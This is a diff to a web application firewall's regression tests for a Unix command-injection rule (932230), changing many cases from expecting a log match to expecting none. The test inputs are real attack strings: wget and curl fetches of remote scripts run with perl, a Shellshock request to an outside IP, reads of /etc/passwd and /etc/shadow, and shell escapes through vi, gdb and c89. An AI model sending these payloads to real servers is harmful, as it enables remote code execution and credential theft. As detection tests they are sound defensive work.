@@ -24,7 +24,7 @@ tests:
             uri: /?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-2
     desc: System Command Injection (932230) from old modsec regressions
     stages:
@@ -44,7 +44,7 @@ tests:
             uri: /?foo=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-3
     desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
     stages:
@@ -144,7 +144,7 @@ tests:
             data: "arg=;top+Something+else+1+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-8
     desc: arg value of "Something „The Title”. After ;ifconfig something" is blocked
     stages:
@@ -164,7 +164,7 @@ tests:
             data: "arg=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+%3Btop+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-9
     desc: Positive test - RCE passed in one of the args
     stages:
@@ -185,7 +185,7 @@ tests:
               arg1=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+something&arg2=system('dig%20cd%20/tmp;ftp%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;zip%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;tex%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;cut%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-10
     desc: RCE from test 932230.yaml combined with html entities in the middle
     stages:
@@ -205,7 +205,7 @@ tests:
             data: "arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;Something+%26%238222%3BThe+Title%26%238221%3B.+After+something;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-11
     desc: RCE from test 932230.yaml combined with html entities at the beginning
     stages:
@@ -225,7 +225,7 @@ tests:
             data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-12
     desc: RCE from test 932230.yaml combined with html entities at the end
     stages:
@@ -245,7 +245,7 @@ tests:
             data: "arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-13
     desc: RCE from https://github.com/payloadbox/command-injection-payload-list and html entities
     stages:
@@ -285,7 +285,7 @@ tests:
             data: "arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-15
     desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
     stages:
@@ -305,7 +305,7 @@ tests:
             data: "arg=%0Acat%20/etc/passwd;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-16
     desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
     stages:
@@ -325,7 +325,7 @@ tests:
             data: "arg=()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`top%20-a\\`\"&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-17
     desc: RCE ;top with html entities two digit decimal of 59 (;)
     stages:
@@ -345,7 +345,7 @@ tests:
             data: "arg=%26%2359%3B+;top"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-18
     desc: Like rule True Negative Rule Integrity 9 but the html entity is concatenation with RCE at the end
     stages:
@@ -365,7 +365,7 @@ tests:
             data: "arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-19
     desc: Like rule True Negative Rule Integrity 9 but the html entity is concatenation with RCE at the beginning
     stages:
@@ -385,7 +385,7 @@ tests:
             data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-20
     desc: Like rule True Negative Rule Integrity 10 but the html entity is concatenation with RCE at the end
     stages:
@@ -405,7 +405,7 @@ tests:
             data: "arg=%0Acat%20/etc/passwd;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-21
     desc: Like rule True Negative Rule Integrity 10 but the html entity is concatenation with RCE at the beginning
     stages:
@@ -425,7 +425,7 @@ tests:
             data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+%0Acat%20/etc/passwd;"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-22
     desc: Like rule True Negative Rule Integrity 11 but the html entity is concatenation with RCE at the end
     stages:
@@ -465,7 +465,7 @@ tests:
             data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+()%20{%20:;};%20/bin/bash%20-c%20\"ftp%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?dig=\\`top%20-a\\`\""
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-24
     desc: RCE in arg and html entity is sent in cookie
     stages:
@@ -524,7 +524,7 @@ tests:
             data: "var=` /bin/cat /etc/passwd`"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-27
     desc: "Unix command injection"
     stages:
@@ -541,7 +541,7 @@ tests:
             data: "var=`cut crs312``dig 34test`"
             version: HTTP/1.1
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-28
     desc: Test RCE with new semantic versions - ;gcc10.1
     stages:
@@ -727,7 +727,7 @@ tests:
               code=;c89 -wrapper sh,-c,id .
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-38
     desc: "55O5COJ5"
     stages:
@@ -745,7 +745,7 @@ tests:
               code=;c89 -wrapper sh,-c,curl\ google.com .
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-39
     desc: "9323HNQU"
     stages:
@@ -763,7 +763,7 @@ tests:
               code=;vi dddd +silent\\ \!whoami +wq
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-40
     desc: "9323HNQU"
     stages:
@@ -781,7 +781,7 @@ tests:
               code=;vim dddd +silent\\ \!whoami +wq
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-41
     desc: "9323HNQU"
     stages:
@@ -799,7 +799,7 @@ tests:
               code=;ex dddd +silent\\ \!whoami +wq
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-42
     desc: "9323HNQU"
     stages:
@@ -817,7 +817,7 @@ tests:
               code=;vi -c:\!pwd
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-43
     desc: "9323HNQU"
     stages:
@@ -835,7 +835,7 @@ tests:
               code=;vim -c:\!pwd
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-44
     desc: "9323HNQU"
     stages:
@@ -853,7 +853,7 @@ tests:
               code=;ex -c:\!pwd
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-45
     desc: "ATFHUJVF"
     stages:
@@ -871,7 +871,7 @@ tests:
               code=;gdb -nx -ex \!whoami -ex quit
             version: HTTP/1.0
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
   - test_title: 932230-46
     desc: "JW2SU88A"
     stages:
@@ -889,4 +889,4 @@ tests:
             data: |
               code=;cat /path/file.gz
           output:
-            log_contains: id "932230"
+            no_log_contains: id "932230"
